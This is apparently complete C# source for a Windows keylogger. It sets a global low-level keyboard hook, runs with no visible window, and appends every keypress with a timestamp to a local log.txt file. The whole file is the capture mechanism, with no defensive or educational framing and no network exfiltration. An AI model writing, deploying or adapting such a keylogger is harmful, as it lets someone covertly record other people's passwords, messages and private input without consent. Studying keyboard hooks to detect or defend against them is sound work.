using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace e;

class Program
{
    [STAThread]
    static void Main(string[] args)
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        KeyboardHook.Start();
        Application.Run();
    }
}

class KeyboardHook
{
    private static readonly StreamWriter writer = new("./log.txt", append: true) { 
        AutoFlush = true
    };
    private const int WH_KEYBOARD_LL = 13; // Keyboard hook
    private const nint WM_KEYDOWN = 0x0100; // Keydown code
    private static readonly LowLevelKeyboardProc _proc = HookCallback; // Callback Function
    private static IntPtr _hookId = IntPtr.Zero; // Hook Id

    [DllImport("user32.dll", CharSet= CharSet.Auto, SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hook); // Remove Hook from Windows

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName); // Get Module Handler


    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam); 

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId); // Set Windows Hook of keyboard to thread

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using(Process curProcess = Process.GetCurrentProcess())
        using(ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,GetModuleHandle(curModule.ModuleName),0);
        }
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            writer.WriteLine($"{DateTime.Now:yyyy-MM-dd HH:mm:ss} {key}");
        }
        return CallNextHookEx(_hookId,nCode,wParam, lParam);
    }
    public static void Start()
    {
        _hookId = SetHook(_proc);
        Application.ApplicationExit += (sender, e) => UnhookWindowsHookEx(_hookId);
    }
}